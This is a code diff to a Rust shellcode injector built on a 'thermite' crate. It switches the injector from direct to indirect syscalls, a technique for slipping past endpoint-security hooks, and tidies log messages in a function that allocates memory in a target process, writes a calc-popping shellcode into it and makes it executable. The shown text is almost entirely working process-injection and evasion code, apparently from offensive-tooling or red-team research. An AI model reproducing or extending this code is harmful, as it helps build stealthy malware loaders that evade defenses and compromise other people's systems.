@@ -6,7 +6,9 @@ use std::fmt::format;
 use thermite::models::windows::nt_status::NtStatus;     // Only needed for printing the status after each syscalls
 use thermite::models::windows::peb_teb::UNICODE_STRING; //
 
-use thermite::{debug, error, info, syscall};
+use thermite::{debug, error, info};
+
+use thermite::indirect_syscall as syscall;
 
 // Don't forget #[repr(C)] !
 
@@ -156,7 +158,7 @@ fn injector(pid: Option<u32>) {
         PAGE_READWRITE,           // [in]      ULONG     Protect
     );
     print_status("NtAllocateVirtualMemory status:", nt_status);
-    info!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");
+    info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
     // Copy the shellcode to newly allocated memory
     let mut bytes_written: usize = 0;
@@ -169,7 +171,7 @@ fn injector(pid: Option<u32>) {
         &mut bytes_written, // [out, optional]   PULONG    NumberOfBytesWritten ,
     );
     print_status("NtWriteVirtualMemory", nt_status);
-    info!("[^-^] Successfully written {buf_size} bytes in remote memory");
+    info!("Successfully written {} bytes in remote memory", buf_size);
 
     // Change protection status of allocated memory to READ+EXECUTE
     let mut bytes_written = POP_CALC.len();
